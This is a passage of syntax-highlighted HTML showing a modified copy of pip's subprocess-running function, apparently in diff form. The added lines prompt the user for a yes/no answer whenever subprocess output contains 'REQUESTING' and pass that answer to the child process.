+</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 85</span><span>) <span style="color:#f92672">-&gt;</span> str:
+</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 86</span><span>    <span style="color:#e6db74">&#34;&#34;&#34;
+</span></span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 87</span><span><span style="color:#e6db74">    Args:
+</span></span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 88</span><span><span style="color:#e6db74">      show_stdout: if true, use INFO to log the subprocess&#39;s stderr and
+</span></span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 89</span><span><span style="color:#e6db74">        stdout streams.  Otherwise, use DEBUG.  Defaults to False.
+</span></span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 90</span><span><span style="color:#e6db74">      extra_ok_returncodes: an iterable of integer return codes that are
+</span></span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 91</span><span><span style="color:#e6db74">        acceptable, in addition to 0. Defaults to None, which means [].
+</span></span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 92</span><span><span style="color:#e6db74">      unset_environ: an iterable of environment variable names to unset
+</span></span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 93</span><span><span style="color:#e6db74">        prior to calling subprocess.Popen().
+</span></span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 94</span><span><span style="color:#e6db74">      log_failed_cmd: if false, failed commands are not logged, only raised.
+</span></span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 95</span><span><span style="color:#e6db74">      stdout_only: if true, return only stdout, else return both. When true,
+</span></span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 96</span><span><span style="color:#e6db74">        logging of both stdout and stderr occurs when the subprocess has
+</span></span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 97</span><span><span style="color:#e6db74">        terminated, else logging occurs as subprocess output is produced.
+</span></span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 98</span><span><span style="color:#e6db74">    &#34;&#34;&#34;</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 99</span><span>    <span style="color:#66d9ef">if</span> extra_ok_returncodes <span style="color:#f92672">is</span> <span style="color:#66d9ef">None</span>:
+</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">100</span><span>        extra_ok_returncodes <span style="color:#f92672">=</span> []
+</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">101</span><span>    <span style="color:#66d9ef">if</span> unset_environ <span style="color:#f92672">is</span> <span style="color:#66d9ef">None</span>:
+</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">102</span><span>        unset_environ <span style="color:#f92672">=</span> []
+</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">103</span><span>    <span style="color:#75715e"># Most places in pip use show_stdout=False. What this means is--</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">104</span><span>    <span style="color:#75715e">#</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">105</span><span>    <span style="color:#75715e"># - We connect the child&#39;s output (combined stderr and stdout) to a</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">106</span><span>    <span style="color:#75715e">#   single pipe, which we read.</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">107</span><span>    <span style="color:#75715e"># - We log this output to stderr at DEBUG level as it is received.</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">108</span><span>    <span style="color:#75715e"># - If DEBUG logging isn&#39;t enabled (e.g. if --verbose logging wasn&#39;t</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">109</span><span>    <span style="color:#75715e">#   requested), then we show a spinner so the user can still see the</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">110</span><span>    <span style="color:#75715e">#   subprocess is in progress.</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">111</span><span>    <span style="color:#75715e"># - If the subprocess exits with an error, we log the output to stderr</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">112</span><span>    <span style="color:#75715e">#   at ERROR level if it hasn&#39;t already been displayed to the console</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">113</span><span>    <span style="color:#75715e">#   (e.g. if --verbose logging wasn&#39;t enabled).  This way we don&#39;t log</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">114</span><span>    <span style="color:#75715e">#   the output to the console twice.</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">115</span><span>    <span style="color:#75715e">#</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">116</span><span>    <span style="color:#75715e"># If show_stdout=True, then the above is still done, but with DEBUG</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">117</span><span>    <span style="color:#75715e"># replaced by INFO.</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">118</span><span>    <span style="color:#66d9ef">if</span> show_stdout:
+</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">119</span><span>        <span style="color:#75715e"># Then log the subprocess output at INFO level.</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">120</span><span>        log_subprocess: Callable[<span style="color:#f92672">...</span>, <span style="color:#66d9ef">None</span>] <span style="color:#f92672">=</span> subprocess_logger<span style="color:#f92672">.</span>info
+</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">121</span><span>        used_level <span style="color:#f92672">=</span> logging<span style="color:#f92672">.</span>INFO
+</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">122</span><span>    <span style="color:#66d9ef">else</span>:
+</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">123</span><span>        <span style="color:#75715e"># Then log the subprocess output using VERBOSE.  This also ensures</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">124</span><span>        <span style="color:#75715e"># it will be logged to the log file (aka user_log), if enabled.</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">125</span><span>        log_subprocess <span style="color:#f92672">=</span> subprocess_logger<span style="color:#f92672">.</span>verbose
+</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">126</span><span>        used_level <span style="color:#f92672">=</span> VERBOSE
+</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">127</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">128</span><span>    <span style="color:#75715e"># Whether the subprocess will be visible in the console.</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">129</span><span>    showing_subprocess <span style="color:#f92672">=</span> subprocess_logger<span style="color:#f92672">.</span>getEffectiveLevel() <span style="color:#f92672">&lt;=</span> used_level
+</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">130</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">131</span><span>    <span style="color:#75715e"># Only use the spinner if we&#39;re not showing the subprocess output</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">132</span><span>    <span style="color:#75715e"># and we have a spinner.</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">133</span><span>    use_spinner <span style="color:#f92672">=</span> <span style="color:#f92672">not</span> showing_subprocess <span style="color:#f92672">and</span> spinner <span style="color:#f92672">is</span> <span style="color:#f92672">not</span> <span style="color:#66d9ef">None</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">134</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">135</span><span>    log_subprocess(<span style="color:#e6db74">&#34;Running command </span><span style="color:#e6db74">%s</span><span style="color:#e6db74">&#34;</span>, command_desc)
+</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">136</span><span>    env <span style="color:#f92672">=</span> os<span style="color:#f92672">.</span>environ<span style="color:#f92672">.</span>copy()
+</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">137</span><span>    <span style="color:#66d9ef">if</span> extra_environ:
+</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">138</span><span>        env<span style="color:#f92672">.</span>update(extra_environ)
+</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">139</span><span>    <span style="color:#66d9ef">for</span> name <span style="color:#f92672">in</span> unset_environ:
+</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">140</span><span>        env<span style="color:#f92672">.</span>pop(name, <span style="color:#66d9ef">None</span>)
+</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">141</span><span>    <span style="color:#66d9ef">try</span>:
+</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">142</span><span>        proc <span style="color:#f92672">=</span> subprocess<span style="color:#f92672">.</span>Popen(
+</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">143</span><span>            <span style="color:#75715e"># Convert HiddenText objects to the underlying str.</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">144</span><span>            reveal_command_args(cmd),
+</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">145</span><span>            stdin<span style="color:#f92672">=</span>subprocess<span style="color:#f92672">.</span>PIPE,
+</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">146</span><span>            stdout<span style="color:#f92672">=</span>subprocess<span style="color:#f92672">.</span>PIPE,
+</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">147</span><span>            stderr<span style="color:#f92672">=</span>subprocess<span style="color:#f92672">.</span>STDOUT <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> stdout_only <span style="color:#66d9ef">else</span> subprocess<span style="color:#f92672">.</span>PIPE,
+</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">148</span><span>            cwd<span style="color:#f92672">=</span>cwd,
+</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">149</span><span>            env<span style="color:#f92672">=</span>env,
+</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">150</span><span>            errors<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;backslashreplace&#34;</span>,
+</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">151</span><span>        )
+</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">152</span><span>    <span style="color:#66d9ef">except</span> <span style="color:#a6e22e">Exception</span> <span style="color:#66d9ef">as</span> exc:
+</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">153</span><span>        <span style="color:#66d9ef">if</span> log_failed_cmd:
+</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">154</span><span>            subprocess_logger<span style="color:#f92672">.</span>critical(
+</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">155</span><span>                <span style="color:#e6db74">&#34;Error </span><span style="color:#e6db74">%s</span><span style="color:#e6db74"> while executing command </span><span style="color:#e6db74">%s</span><span style="color:#e6db74">&#34;</span>,
+</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">156</span><span>                exc,
+</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">157</span><span>                command_desc,
+</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">158</span><span>            )
+</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">159</span><span>        <span style="color:#66d9ef">raise</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">160</span><span>    all_output <span style="color:#f92672">=</span> []
+</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">161</span><span>    <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> stdout_only:
+</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">162</span><span>        <span style="color:#66d9ef">assert</span> proc<span style="color:#f92672">.</span>stdout
+</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">163</span><span>        <span style="color:#66d9ef">assert</span> proc<span style="color:#f92672">.</span>stdin
+</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">164</span><span>        <span style="color:#75715e"># In this mode, stdout and stderr are in the same pipe.</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">165</span><span>        <span style="color:#66d9ef">while</span> <span style="color:#66d9ef">True</span>:
+</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">166</span><span>            line: str <span style="color:#f92672">=</span> proc<span style="color:#f92672">.</span>stdout<span style="color:#f92672">.</span>readline()
+</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">167</span><span>            <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> line:
+</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">168</span><span>                <span style="color:#66d9ef">break</span>
+</span></span><span style="display:flex; background-color:#3c3d38"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">169</span><span>            <span style="color:#66d9ef">if</span> <span style="color:#e6db74">&#39;REQUESTING&#39;</span> <span style="color:#f92672">in</span> line:
+</span></span><span style="display:flex; background-color:#3c3d38"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">170</span><span>                line_without_newline <span style="color:#f92672">=</span> line<span style="color:#f92672">.</span>replace(<span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>, <span style="color:#e6db74">&#39;&#39;</span>)
+</span></span><span style="display:flex; background-color:#3c3d38"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">171</span><span>                proc<span style="color:#f92672">.</span>stdout<span style="color:#f92672">.</span>flush()
+</span></span><span style="display:flex; background-color:#3c3d38"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">172</span><span>                data <span style="color:#f92672">=</span> input(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;Package is </span><span style="color:#e6db74">{</span>line_without_newline<span style="color:#e6db74">}</span><span style="color:#e6db74">. (y)es or (n)o</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>)
+</span></span><span style="display:flex; background-color:#3c3d38"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">173</span><span>                proc<span style="color:#f92672">.</span>stdin<span style="color:#f92672">.</span>write(data<span style="color:#f92672">+</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>)
+</span></span><span style="display:flex; background-color:#3c3d38"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">174</span><span>                proc<span style="color:#f92672">.</span>stdin<span style="color:#f92672">.</span>flush()
+</span></span><span style="display:flex; background-color:#3c3d38"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">175</span><span>            <span style="color:#66d9ef">else</span>:
+</span></span><span style="display:flex; background-color:#3c3d38"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">176</span><span>                <span style="color:#75715e"># Show the line immediately.</span>
+</span></span><span style="display:flex; background-color:#3c3d38"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">177</span><span>                log_subprocess(line)
+</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">178</span><span>            line <span style="color:#f92672">=</span> line<span style="color:#f92672">.</span>rstrip()
+</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">179</span><span>            all_output<span style="color:#f92672">.</span>append(line <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">180</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">181</span><span>        <span style="color:#66d9ef">try</span>:
+</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">182</span><span>            proc<span style="color:#f92672">.</span>wait()
+</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">183</span><span>        <span style="color:#66d9ef">finally</span>:
+</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">184</span><span>            <span style="color:#66d9ef">if</span> proc<span style="color:#f92672">.</span>stdout:
+</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">185</span><span>                proc<span style="color:#f92672">.</span>stdout<span style="color:#f92672">.</span>close()
+</span></span><span style="display:flex; background-color:#3c3d38"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">186</span><span>            proc<span style="color:#f92672">.</span>stdin<span style="color:#f92672">.</span>close()
+</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">187</span><span>        output <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">.</span>join(all_output)
+</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">188</span><span>    <span style="color:#66d9ef">else</span>:
+</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">189</span><span>        <span style="color:#75715e"># In this mode, stdout and stderr are in different pipes.</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">190</span><span>        <span style="color:#75715e"># We must use communicate() which is the only safe way to read both.</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">191</span><span>        out, err <span style="color:#f92672">=</span> proc<span style="color:#f92672">.</span>communicate()
+</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">192</span><span>        <span style="color:#75715e"># log line by line to preserve pip log indenting</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">193</span><span>        <span style="color:#66d9ef">for</span> out_line <span style="color:#f92672">in</span> out<span style="color:#f92672">.</span>splitlines():
+</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">194</span><span>            log_subprocess(out_line)
+</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">195</span><span>        all_output<span style="color:#f92672">.</span>append(out)
+</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">196</span><span>        <span style="color:#66d9ef">for</span> err_line <span style="color:#f92672">in</span> err<span style="color:#f92672">.</span>splitlines():
+</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">197</span><span>            log_subprocess(err_line)
+</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">198</span><span>        all_output<span style="color:#f92672">.</span>append(err)
+</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">199</span><span>        output <span style="color:#f92672">=</span> out
+</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">200</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">201</span><span>    proc_had_error <span style="color:#f92672">=</span> proc<span style="color:#f92672">.</span>returncode <span style="color:#f92672">and</span> proc<span style="color:#f92672">.</span>returncode <span style="color:#f92672">not</span> <span style="color:#f92672">in</span> extra_ok_returncodes
+</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">202</span><span>    <span style="color:#66d9ef">if</span> use_spinner:
+</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">203</span><span>        <span style="color:#66d9ef">assert</span> spinner
+</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">204</span><span>        <span style="color:#66d9ef">if</span> proc_had_error:
+</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">205</span><span>            spinner<span style="color:#f92672">.</span>finish(<span style="color:#e6db74">&#34;error&#34;</span>)
+</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">206</span><span>        <span style="color:#66d9ef">else</span>:
+</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">207</span><span>            spinner<span style="color:#f92672">.</span>finish(<span style="color:#e6db74">&#34;done&#34;</span>)
+</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">208</span><span>    <span style="color:#66d9ef">if</span> proc_had_error:
+</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">209</span><span>        <span style="color:#66d9ef">if</span> on_returncode <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;raise&#34;</span>:
+</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">210</span><span>            error <span style="color:#f92672">=</span> InstallationSubprocessError(
+</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">211</span><span>                command_description<span style="color:#f92672">=</span>command_desc,
+</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">212</span><span>                exit_code<span style="color:#f92672">=</span>proc<span style="color:#f92672">.</span>returncode,
+</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">213</span><span>                output_lines<span style="color:#f92672">=</span>all_output <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> showing_subprocess <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">None</span>,
+</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">214</span><span>            )
+</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">215</span><span>            <span style="color:#66d9ef">if</span> log_failed_cmd:
